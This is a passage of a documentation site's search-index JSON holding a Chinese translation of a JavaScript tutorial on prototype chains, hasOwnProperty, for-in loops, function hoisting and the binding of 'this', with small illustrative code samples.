\u4f1a**\u5411\u4e0a**\u904d\u5386\u539f\u578b\u94fe\uff0c\u76f4\u5230\u627e\u5230\u7ed9\u5b9a\u540d\u79f0\u7684\u5c5e\u6027\u4e3a\u6b62\u3002\u5230\u67e5\u627e\u5230\u8fbe\u539f\u578b\u94fe\u7684\u9876\u90e8 - \u4e5f\u5c31\u662f <code>Object.prototype</code> - \u4f46\u662f\u4ecd\u7136\u6ca1\u6709\u627e\u5230\u6307\u5b9a\u7684\u5c5e\u6027\uff0c\u5c31\u4f1a\u8fd4\u56de undefined\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_9","title":"\u539f\u578b\u5c5e\u6027","text":"<p>\u5f53\u539f\u578b\u5c5e\u6027\u7528\u6765\u521b\u5efa\u539f\u578b\u94fe\u65f6\uff0c\u53ef\u4ee5\u628a**\u4efb\u4f55**\u7c7b\u578b\u7684\u503c\u8d4b\u7ed9\u5b83\uff08prototype\uff09\u3002 \u7136\u800c\u5c06\u539f\u5b50\u7c7b\u578b\u8d4b\u7ed9 prototype \u7684\u64cd\u4f5c\u5c06\u4f1a\u88ab\u5ffd\u7565\u3002</p> <pre><code>function Foo() {}\nFoo.prototype = 1; // \u65e0\u6548\n</code></pre> <p>\u800c\u5c06\u5bf9\u8c61\u8d4b\u503c\u7ed9 prototype\uff0c\u6b63\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u6240\u793a\uff0c\u5c06\u4f1a\u52a8\u6001\u7684\u521b\u5efa\u539f\u578b\u94fe\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_10","title":"\u6027\u80fd","text":"<p>\u5982\u679c\u4e00\u4e2a\u5c5e\u6027\u5728\u539f\u578b\u94fe\u7684\u4e0a\u7aef\uff0c\u5219\u5bf9\u4e8e\u67e5\u627e\u65f6\u95f4\u5c06\u5e26\u6765\u4e0d\u5229\u5f71\u54cd\u3002\u7279\u522b\u7684\uff0c\u8bd5\u56fe\u83b7\u53d6\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u5c06\u4f1a\u904d\u5386\u6574\u4e2a\u539f\u578b\u94fe\u3002</p> <p>\u5e76\u4e14\uff0c\u5f53\u4f7f\u7528 <code>for in</code> \u5faa\u73af\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u65f6\uff0c\u539f\u578b\u94fe\u4e0a\u7684**\u6240\u6709**\u5c5e\u6027\u90fd\u5c06\u88ab\u8bbf\u95ee\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_11","title":"\u6269\u5c55\u5185\u7f6e\u7c7b\u578b\u7684\u539f\u578b","text":"<p>\u4e00\u4e2a\u9519\u8bef\u7279\u6027\u88ab\u7ecf\u5e38\u4f7f\u7528\uff0c\u90a3\u5c31\u662f\u6269\u5c55 <code>Object.prototype</code> \u6216\u8005\u5176\u4ed6\u5185\u7f6e\u7c7b\u578b\u7684\u539f\u578b\u5bf9\u8c61\u3002</p> <p>\u8fd9\u79cd\u6280\u672f\u88ab\u79f0\u4e4b\u4e3a monkey patching \u5e76\u4e14\u4f1a\u7834\u574f_\u5c01\u88c5_\u3002\u867d\u7136\u5b83\u88ab\u5e7f\u6cdb\u7684\u5e94\u7528\u5230\u4e00\u4e9b JavaScript \u7c7b\u5e93\u4e2d\u6bd4\u5982 Prototype, \u4f46\u662f\u6211\u4ecd\u7136\u4e0d\u8ba4\u4e3a\u4e3a\u5185\u7f6e\u7c7b\u578b\u6dfb\u52a0\u4e00\u4e9b_\u975e\u6807\u51c6_\u7684\u51fd\u6570\u662f\u4e2a\u597d\u4e3b\u610f\u3002</p> <p>\u6269\u5c55\u5185\u7f6e\u7c7b\u578b\u7684**\u552f\u4e00**\u7406\u7531\u662f\u4e3a\u4e86\u548c\u65b0\u7684 JavaScript \u4fdd\u6301\u4e00\u81f4\uff0c\u6bd4\u5982 <code>Array.forEach</code>\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u662f\u7f16\u7a0b\u9886\u57df\u5e38\u7528\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u79f0\u4e4b\u4e3a Backport\uff0c\u4e5f\u5c31\u662f\u5c06\u65b0\u7684\u8865\u4e01\u6dfb\u52a0\u5230\u8001\u7248\u672c\u4e2d\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_12","title":"\u603b\u7ed3","text":"<p>\u5728\u5199\u590d\u6742\u7684 JavaScript \u5e94\u7528\u4e4b\u524d\uff0c\u5145\u5206\u7406\u89e3\u539f\u578b\u94fe\u7ee7\u627f\u7684\u5de5\u4f5c\u65b9\u5f0f\u662f\u6bcf\u4e2a JavaScript \u7a0b\u5e8f\u5458**\u5fc5\u4fee**\u7684\u529f\u8bfe\u3002 \u8981\u63d0\u9632\u539f\u578b\u94fe\u8fc7\u957f\u5e26\u6765\u7684\u6027\u80fd\u95ee\u9898\uff0c\u5e76\u77e5\u9053\u5982\u4f55\u901a\u8fc7\u7f29\u77ed\u539f\u578b\u94fe\u6765\u63d0\u9ad8\u6027\u80fd\u3002 \u66f4\u8fdb\u4e00\u6b65\uff0c\u7edd\u5bf9**\u4e0d\u8981**\u6269\u5c55\u5185\u7f6e\u7c7b\u578b\u7684\u539f\u578b\uff0c\u9664\u975e\u662f\u4e3a\u4e86\u548c\u65b0\u7684 JavaScript \u5f15\u64ce\u517c\u5bb9\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#hasownproperty","title":"<code>hasOwnProperty</code> \u51fd\u6570","text":"<p>\u4e3a\u4e86\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u5305\u542b_\u81ea\u5b9a\u4e49_\u5c5e\u6027\u800c_\u4e0d\u662f_\u539f\u578b\u94fe\u4e0a\u7684\u5c5e\u6027\uff0c \u6211\u4eec\u9700\u8981\u4f7f\u7528\u7ee7\u627f\u81ea <code>Object.prototype</code> \u7684 <code>hasOwnProperty</code> \u65b9\u6cd5\u3002</p> <p>\u6ce8\u610f: \u901a\u8fc7\u5224\u65ad\u4e00\u4e2a\u5c5e\u6027\u662f\u5426 <code>undefined</code> \u662f**\u4e0d\u591f**\u7684\u3002 \u56e0\u4e3a\u4e00\u4e2a\u5c5e\u6027\u53ef\u80fd\u786e\u5b9e\u5b58\u5728\uff0c\u53ea\u4e0d\u8fc7\u5b83\u7684\u503c\u88ab\u8bbe\u7f6e\u4e3a <code>undefined</code>\u3002</p> <p><code>hasOwnProperty</code> \u662f JavaScript \u4e2d\u552f\u4e00\u4e00\u4e2a\u5904\u7406\u5c5e\u6027\u4f46\u662f**\u4e0d**\u67e5\u627e\u539f\u578b\u94fe\u7684\u51fd\u6570\u3002</p> <pre><code>// \u4fee\u6539Object.prototype\nObject.prototype.bar = 1; \nvar foo = {goo: undefined};\n\nfoo.bar; // 1\n'bar' in foo; // true\n\nfoo.hasOwnProperty('bar'); // false\nfoo.hasOwnProperty('goo'); // true\n</code></pre> <p>\u53ea\u6709 <code>hasOwnProperty</code> \u53ef\u4ee5\u7ed9\u51fa\u6b63\u786e\u548c\u671f\u671b\u7684\u7ed3\u679c\uff0c\u8fd9\u5728\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u65f6\u4f1a\u5f88\u6709\u7528\u3002 **\u6ca1\u6709**\u5176\u5b83\u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u6392\u9664\u539f\u578b\u94fe\u4e0a\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u5728\u5bf9\u8c61_\u81ea\u8eab_\u4e0a\u7684\u5c5e\u6027\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#hasownproperty_1","title":"<code>hasOwnProperty</code> \u4f5c\u4e3a\u5c5e\u6027","text":"<p>JavaScript **\u4e0d\u4f1a**\u4fdd\u62a4 <code>hasOwnProperty</code> \u88ab\u975e\u6cd5\u5360\u7528\uff0c\u56e0\u6b64\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u78b0\u5de7\u5b58\u5728\u8fd9\u4e2a\u5c5e\u6027\uff0c \u5c31\u9700\u8981\u4f7f\u7528_\u5916\u90e8_\u7684 <code>hasOwnProperty</code> \u51fd\u6570\u6765\u83b7\u53d6\u6b63\u786e\u7684\u7ed3\u679c\u3002</p> <pre><code>var foo = {\n    hasOwnProperty: function() {\n        return false;\n    },\n    bar: 'Here be dragons'\n};\n\nfoo.hasOwnProperty('bar'); // \u603b\u662f\u8fd4\u56de false\n\n// \u4f7f\u7528\u5176\u5b83\u5bf9\u8c61\u7684 hasOwnProperty\uff0c\u5e76\u5c06\u5176\u4e0a\u4e0b\u6587\u8bbe\u7f6e\u4e3afoo\n({}).hasOwnProperty.call(foo, 'bar'); // true\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_13","title":"\u7ed3\u8bba","text":"<p>\u5f53\u68c0\u67e5\u5bf9\u8c61\u4e0a\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u5b58\u5728\u65f6\uff0c<code>hasOwnProperty</code> \u662f**\u552f\u4e00**\u53ef\u7528\u7684\u65b9\u6cd5\u3002 \u540c\u65f6\u5728\u4f7f\u7528 <code>for in</code> loop \u904d\u5386\u5bf9\u8c61\u65f6\uff0c\u63a8\u8350**\u603b\u662f**\u4f7f\u7528 <code>hasOwnProperty</code> \u65b9\u6cd5\uff0c \u8fd9\u5c06\u4f1a\u907f\u514d\u539f\u578b\u5bf9\u8c61\u6269\u5c55\u5e26\u6765\u7684\u5e72\u6270\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#for-in","title":"<code>for in</code> \u5faa\u73af","text":"<p>\u548c <code>in</code> \u64cd\u4f5c\u7b26\u4e00\u6837\uff0c<code>for in</code> \u5faa\u73af\u540c\u6837\u5728\u67e5\u627e\u5bf9\u8c61\u5c5e\u6027\u65f6\u904d\u5386\u539f\u578b\u94fe\u4e0a\u7684\u6240\u6709\u5c5e\u6027\u3002</p> <p>\u6ce8\u610f: <code>for in</code> \u5faa\u73af**\u4e0d\u4f1a**\u904d\u5386\u90a3\u4e9b <code>enumerable</code> \u8bbe\u7f6e\u4e3a <code>false</code> \u7684\u5c5e\u6027\uff1b\u6bd4\u5982\u6570\u7ec4\u7684 <code>length</code> \u5c5e\u6027\u3002</p> <pre><code>// \u4fee\u6539 Object.prototype\nObject.prototype.bar = 1;\n\nvar foo = {moo: 2};\nfor(var i in foo) {\n    console.log(i); // \u8f93\u51fa\u4e24\u4e2a\u5c5e\u6027\uff1abar \u548c moo\n}\n</code></pre> <p>\u7531\u4e8e\u4e0d\u53ef\u80fd\u6539\u53d8 <code>for in</code> \u81ea\u8eab\u7684\u884c\u4e3a\uff0c\u56e0\u6b64\u6709\u5fc5\u8981\u8fc7\u6ee4\u51fa\u90a3\u4e9b\u4e0d\u5e0c\u671b\u51fa\u73b0\u5728\u5faa\u73af\u4f53\u4e2d\u7684\u5c5e\u6027\uff0c \u8fd9\u53ef\u4ee5\u901a\u8fc7 <code>Object.prototype</code> \u539f\u578b\u4e0a\u7684 <code>hasOwnProperty</code>\u51fd\u6570\u6765\u5b8c\u6210\u3002</p> <p>\u6ce8\u610f: \u7531\u4e8e <code>for in</code> \u603b\u662f\u8981\u904d\u5386\u6574\u4e2a\u539f\u578b\u94fe\uff0c\u56e0\u6b64\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u7684\u7ee7\u627f\u5c42\u6b21\u592a\u6df1\u7684\u8bdd\u4f1a\u5f71\u54cd\u6027\u80fd\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#hasownproperty_2","title":"\u4f7f\u7528 <code>hasOwnProperty</code> \u8fc7\u6ee4","text":"<pre><code>// foo \u53d8\u91cf\u662f\u4e0a\u4f8b\u4e2d\u7684\nfor(var i in foo) {\n    if (foo.hasOwnProperty(i)) {\n        console.log(i);\n    }\n}\n</code></pre> <p>\u8fd9\u4e2a\u7248\u672c\u7684\u4ee3\u7801\u662f\u552f\u4e00\u6b63\u786e\u7684\u5199\u6cd5\u3002\u7531\u4e8e\u6211\u4eec\u4f7f\u7528\u4e86 <code>hasOwnProperty</code>\uff0c\u6240\u4ee5\u8fd9\u6b21**\u53ea**\u8f93\u51fa <code>moo</code>\u3002 \u5982\u679c\u4e0d\u4f7f\u7528 <code>hasOwnProperty</code>\uff0c\u5219\u8fd9\u6bb5\u4ee3\u7801\u5728\u539f\u751f\u5bf9\u8c61\u539f\u578b\uff08\u6bd4\u5982 <code>Object.prototype</code>\uff09\u88ab\u6269\u5c55\u65f6\u53ef\u80fd\u4f1a\u51fa\u9519\u3002</p> <p>\u4e00\u4e2a\u5e7f\u6cdb\u4f7f\u7528\u7684\u7c7b\u5e93 Prototype \u5c31\u6269\u5c55\u4e86\u539f\u751f\u7684 JavaScript \u5bf9\u8c61\u3002 \u56e0\u6b64\uff0c\u5f53\u8fd9\u4e2a\u7c7b\u5e93\u88ab\u5305\u542b\u5728\u9875\u9762\u4e2d\u65f6\uff0c\u4e0d\u4f7f\u7528 <code>hasOwnProperty</code> \u8fc7\u6ee4\u7684 <code>for in</code> \u5faa\u73af\u96be\u514d\u4f1a\u51fa\u95ee\u9898\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_14","title":"\u603b\u7ed3","text":"<p>\u63a8\u8350**\u603b\u662f**\u4f7f\u7528 <code>hasOwnProperty</code>\u3002\u4e0d\u8981\u5bf9\u4ee3\u7801\u8fd0\u884c\u7684\u73af\u5883\u505a\u4efb\u4f55\u5047\u8bbe\uff0c\u4e0d\u8981\u5047\u8bbe\u539f\u751f\u5bf9\u8c61\u662f\u5426\u5df2\u7ecf\u88ab\u6269\u5c55\u4e86\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_15","title":"\u51fd\u6570","text":""},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_16","title":"\u51fd\u6570\u58f0\u660e\u4e0e\u8868\u8fbe\u5f0f","text":"<p>\u51fd\u6570\u662fJavaScript\u4e2d\u7684\u4e00\u7b49\u5bf9\u8c61\uff0c\u8fd9\u610f\u5473\u7740\u53ef\u4ee5\u628a\u51fd\u6570\u50cf\u5176\u5b83\u503c\u4e00\u6837\u4f20\u9012\u3002 \u4e00\u4e2a\u5e38\u89c1\u7684\u7528\u6cd5\u662f\u628a_\u533f\u540d\u51fd\u6570_\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\u4f20\u9012\u5230\u5f02\u6b65\u51fd\u6570\u4e2d\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_17","title":"\u51fd\u6570\u58f0\u660e","text":"<pre><code>function foo() {}\n</code></pre> <p>\u4e0a\u9762\u7684\u65b9\u6cd5\u4f1a\u5728\u6267\u884c\u524d\u88ab \u89e3\u6790(hoisted)\uff0c\u56e0\u6b64\u5b83\u5b58\u5728\u4e8e\u5f53\u524d\u4e0a\u4e0b\u6587\u7684_\u4efb\u610f_\u4e00\u4e2a\u5730\u65b9\uff0c \u5373\u4f7f\u5728\u51fd\u6570\u5b9a\u4e49\u4f53\u7684\u4e0a\u9762\u88ab\u8c03\u7528\u4e5f\u662f\u5bf9\u7684\u3002</p> <pre><code>foo(); // \u6b63\u5e38\u8fd0\u884c\uff0c\u56e0\u4e3afoo\u5728\u4ee3\u7801\u8fd0\u884c\u524d\u5df2\u7ecf\u88ab\u521b\u5efa\nfunction foo() {}\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_18","title":"\u51fd\u6570\u8d4b\u503c\u8868\u8fbe\u5f0f","text":"<pre><code>var foo = function() {};\n</code></pre> <p>\u8fd9\u4e2a\u4f8b\u5b50\u628a\u4e00\u4e2a_\u533f\u540d_\u7684\u51fd\u6570\u8d4b\u503c\u7ed9\u53d8\u91cf <code>foo</code>\u3002</p> <pre><code>foo; // 'undefined'\nfoo(); // \u51fa\u9519\uff1aTypeError\nvar foo = function() {};\n</code></pre> <p>\u7531\u4e8e <code>var</code> \u5b9a\u4e49\u4e86\u4e00\u4e2a\u58f0\u660e\u8bed\u53e5\uff0c\u5bf9\u53d8\u91cf <code>foo</code> \u7684\u89e3\u6790\u662f\u5728\u4ee3\u7801\u8fd0\u884c\u4e4b\u524d\uff0c\u56e0\u6b64 <code>foo</code> \u53d8\u91cf\u5728\u4ee3\u7801\u8fd0\u884c\u65f6\u5df2\u7ecf\u88ab\u5b9a\u4e49\u8fc7\u4e86\u3002</p> <p>\u4f46\u662f\u7531\u4e8e\u8d4b\u503c\u8bed\u53e5\u53ea\u5728\u8fd0\u884c\u65f6\u6267\u884c\uff0c\u56e0\u6b64\u5728\u76f8\u5e94\u4ee3\u7801\u6267\u884c\u4e4b\u524d\uff0c <code>foo</code> \u7684\u503c\u7f3a\u7701\u4e3a undefined\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_19","title":"\u547d\u540d\u51fd\u6570\u7684\u8d4b\u503c\u8868\u8fbe\u5f0f","text":"<p>\u53e6\u5916\u4e00\u4e2a\u7279\u6b8a\u7684\u60c5\u51b5\u662f\u5c06\u547d\u540d\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf\u3002</p> <pre><code>var foo = function bar() {\n    bar(); // \u6b63\u5e38\u8fd0\u884c\n}\nbar(); // \u51fa\u9519\uff1aReferenceError\n</code></pre> <p><code>bar</code> \u51fd\u6570\u58f0\u660e\u5916\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u5df2\u7ecf\u628a\u51fd\u6570\u8d4b\u503c\u7ed9\u4e86 <code>foo</code>\uff1b \u7136\u800c\u5728 <code>bar</code> \u5185\u90e8\u4f9d\u7136\u53ef\u89c1\u3002\u8fd9\u662f\u7531\u4e8e JavaScript \u7684 \u547d\u540d\u5904\u7406 \u6240\u81f4\uff0c \u51fd\u6570\u540d\u5728\u51fd\u6570\u5185_\u603b\u662f_\u53ef\u89c1\u7684\u3002</p> <p>**\u6ce8\u610f:**\u5728IE8\u53caIE8\u4ee5\u4e0b\u7248\u672c\u6d4f\u89c8\u5668bar\u5728\u5916\u90e8\u4e5f\u662f\u53ef\u89c1\u7684\uff0c\u662f\u56e0\u4e3a\u6d4f\u89c8\u5668\u5bf9\u547d\u540d\u51fd\u6570\u8d4b\u503c\u8868\u8fbe\u5f0f\u8fdb\u884c\u4e86\u9519\u8bef\u7684\u89e3\u6790\uff0c \u89e3\u6790\u6210\u4e24\u4e2a\u51fd\u6570 <code>foo</code> \u548c <code>bar</code></p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#this","title":"<code>this</code> \u7684\u5de5\u4f5c\u539f\u7406","text":"<p>JavaScript \u6709\u4e00\u5957\u5b8c\u5168\u4e0d\u540c\u4e8e\u5176\u5b83\u8bed\u8a00\u7684\u5bf9 <code>this</code> \u7684\u5904\u7406\u673a\u5236\u3002 \u5728**\u4e94**\u79cd\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b \uff0c<code>this</code> \u6307\u5411\u7684\u5404\u4e0d\u76f8\u540c\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_20","title":"\u5168\u5c40\u8303\u56f4\u5185","text":"<pre><code>this;\n</code></pre> <p>\u5f53\u5728\u5168\u90e8\u8303\u56f4\u5185\u4f7f\u7528 <code>this</code>\uff0c\u5b83\u5c06\u4f1a\u6307\u5411_\u5168\u5c40_\u5bf9\u8c61\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u7684 JavaScript \u811a\u672c\uff0c\u8fd9\u4e2a\u5168\u5c40\u5bf9\u8c61\u662f <code>window</code>\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_21","title":"\u51fd\u6570\u8c03\u7528","text":"<pre><code>foo();\n</code></pre> <p>\u8fd9\u91cc <code>this</code> \u4e5f\u4f1a\u6307\u5411_\u5168\u5c40_\u5bf9\u8c61\u3002</p> <p>ES5 \u6ce8\u610f: \u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\uff08strict mode\uff09\uff0c\u4e0d\u5b58\u5728\u5168\u5c40\u53d8\u91cf\u3002 \u8fd9\u79cd\u60c5\u51b5\u4e0b <code>this</code> \u5c06\u4f1a\u662f <code>undefined</code>\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_22","title":"\u65b9\u6cd5\u8c03\u7528","text":"<pre><code>test.foo(); \n</code></pre> <p>\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c<code>this</code> \u6307\u5411 <code>test</code> \u5bf9\u8c61\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_23","title":"\u8c03\u7528\u6784\u9020\u51fd\u6570","text":"<pre><code>new foo(); \n</code></pre> <p>\u5982\u679c\u51fd\u6570\u503e\u5411\u4e8e\u548c <code>new</code> \u5173\u952e\u8bcd\u4e00\u5757\u4f7f\u7528\uff0c\u5219\u6211\u4eec\u79f0\u8fd9\u4e2a\u51fd\u6570\u662f \u6784\u9020\u51fd\u6570\u3002 \u5728\u51fd\u6570\u5185\u90e8\uff0c<code>this</code> \u6307\u5411_\u65b0\u521b\u5efa_\u7684\u5bf9\u8c61\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#this_1","title":"\u663e\u5f0f\u7684\u8bbe\u7f6e <code>this</code>","text":"<pre><code>function foo(a, b, c) {}\n\nvar bar = {};\nfoo.apply(bar, [1, 2, 3]); // \u6570\u7ec4\u5c06\u4f1a\u88ab\u6269\u5c55\uff0c\u5982\u4e0b\u6240\u793a\nfoo.call(bar, 1, 2, 3); // \u4f20\u9012\u5230foo\u7684\u53c2\u6570\u662f\uff1aa = 1, b = 2, c = 3\n</code></pre> <p>\u5f53\u4f7f\u7528 <code>Function.prototype</code> \u4e0a\u7684 <code>call</code> \u6216\u8005 <code>apply</code> \u65b9\u6cd5\u65f6\uff0c\u51fd\u6570\u5185\u7684 <code>this</code> \u5c06\u4f1a\u88ab **\u663e\u5f0f\u8bbe\u7f6e**\u4e3a\u51fd\u6570\u8c03\u7528\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002</p> <p>\u56e0\u6b64_\u51fd\u6570\u8c03\u7528_\u7684\u89c4\u5219\u5728\u4e0a\u4f8b\u4e2d\u5df2\u7ecf\u4e0d\u9002\u7528\u4e86\uff0c\u5728<code>foo</code> \u51fd\u6570\u5185 <code>this</code> \u88ab\u8bbe\u7f6e\u6210\u4e86 <code>bar</code>\u3002</p> <p>\u6ce8\u610f: \u5728\u5bf9\u8c61\u7684\u5b57\u9762\u58f0\u660e\u8bed\u6cd5\u4e2d\uff0c<code>this</code> **\u4e0d\u80fd**\u7528\u6765\u6307\u5411\u5bf9\u8c61\u672c\u8eab\u3002 \u56e0\u6b64 <code>var obj = {me: this}</code> \u4e2d\u7684 <code>me</code> \u4e0d\u4f1a\u6307\u5411 <code>obj</code>\uff0c\u56e0\u4e3a <code>this</code> \u53ea\u53ef\u80fd\u51fa\u73b0\u5728\u4e0a\u8ff0\u7684\u4e94\u79cd\u60c5\u51b5\u4e2d\u3002 **\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c\u662f\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\uff0c<code>obj.me</code> \u7b49\u4e8e <code>window</code> \u5bf9\u8c61\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_24","title":"\u5e38\u89c1\u8bef\u89e3","text":"<p>\u5c3d\u7ba1\u5927\u90e8\u5206\u7684\u60c5\u51b5\u90fd\u8bf4\u7684\u8fc7\u53bb\uff0c\u4e0d\u8fc7\u7b2c\u4e00\u4e2a\u89c4\u5219\uff08**\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u91cc\u6307\u7684\u5e94\u8be5\u662f\u7b2c\u4e8c\u4e2a\u89c4\u5219\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u8c03\u7528\u51fd\u6570\u65f6\uff0c<code>this</code> \u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff09 \u88ab\u8ba4\u4e3a\u662fJavaScript\u8bed\u8a00\u53e6\u4e00\u4e2a\u9519\u8bef\u8bbe\u8ba1\u7684\u5730\u65b9\uff0c\u56e0\u4e3a\u5b83**\u4ece\u6765**\u5c31\u6ca1\u6709\u5b9e\u9645\u7684\u7528\u9014\u3002</p> <pre><code>Foo.method = function() {\n    function test() {\n        // this \u5c06\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u5168\u5c40\u5bf9\u8c61\uff08\u8bd1\u8005\u6ce8\uff1a\u6d4f\u89c8\u5668\u73af\u5883\u4e2d\u4e5f\u5c31\u662f window \u5bf9\u8c61\uff09\n    }\n    test();\n}\n</code></pre> <p>\u4e00\u4e2a\u5e38\u89c1\u7684\u8bef\u89e3\u662f <code>test</code> \u4e2d\u7684 <code>this</code> \u5c06\u4f1a\u6307\u5411 <code>Foo</code> \u5bf9\u8c61\uff0c\u5b9e\u9645\u4e0a**\u4e0d\u662f**\u8fd9\u6837\u5b50\u7684\u3002</p> <p>\u4e3a\u4e86\u5728 <code>test</code> \u4e2d\u83b7\u53d6\u5bf9 <code>Foo</code> \u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u6211\u4eec\u9700\u8981\u5728 <code>method</code> \u51fd\u6570\u5185\u90e8\u521b\u5efa\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\u6307\u5411 <code>Foo</code> \u5bf9\u8c61\u3002</p> <pre><code>Foo.method = function() {\n    var that = this;\n    function test() {\n        // \u4f7f\u7528 that \u6765\u6307\u5411 Foo \u5bf9\u8c61\n    }\n    test();\n}\n</code></pre> <p><code>that</code> \u53ea\u662f\u6211\u4eec\u968f\u610f\u8d77\u7684\u540d\u5b57\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u540d\u5b57\u88ab\u5e7f\u6cdb\u7684\u7528\u6765\u6307\u5411\u5916\u90e8\u7684 <code>this</code>\u5bf9\u8c61\u3002 \u5728 \u95ed\u5305 \u4e00\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 <code>that</code> \u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_25","title":"\u65b9\u6cd5\u7684\u8d4b\u503c\u8868\u8fbe\u5f0f","text":"<p>\u53e6\u4e00\u4e2a\u770b\u8d77\u6765\u5947\u602a\u7684\u5730\u65b9\u662f\u51fd\u6570\u522b\u540d\uff0c\u4e5f\u5c31\u662f\u5c06\u4e00\u4e2a\u65b9\u6cd5**\u8d4b\u503c**\u7ed9\u4e00\u4e2a\u53d8\u91cf\u3002</p> <pre><code>var test = someObject.methodTest;\ntest();\n</code></pre> <p>\u4e0a\u4f8b\u4e2d\uff0c<code>test</code> \u5c31\u50cf\u4e00\u4e2a\u666e\u901a\u7684\u51fd\u6570\u88ab\u8c03\u7528\uff1b\u56e0\u6b64\uff0c\u51fd\u6570\u5185\u7684 <code>this</code> \u5c06\u4e0d\u518d\u88ab\u6307\u5411\u5230 <code>someObject</code> \u5bf9\u8c61\u3002</p> <p>\u867d\u7136 <code>this</code> \u7684\u665a\u7ed1\u5b9a\u7279\u6027\u4f3c\u4e4e\u5e76\u4e0d\u53cb\u597d\uff0c\u4f46\u8fd9\u786e\u5b9e\u662f\u57fa\u4e8e\u539f\u578b\u7ee7\u627f\u8d56\u4ee5\u751f\u5b58\u7684\u571f\u58e4\u3002</p> <pre><code>function Foo() {}\nFoo.prototype.method = function() {};\n\nfunction Bar() {}\nBar.prototype = Foo.prototype;\n\nnew Bar().method();\n</code></pre> <p>\u5f53 <code>method</code> \u88ab\u8c03\u7528\u65f6\uff0c<code>this</code> \u5c06\u4f1a\u6307\u5411 <code>Bar</code> \u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_26","title":"\u95ed\u5305\u548c\u5f15\u7528","text":"<p>\u95ed\u5305\u662f JavaScript 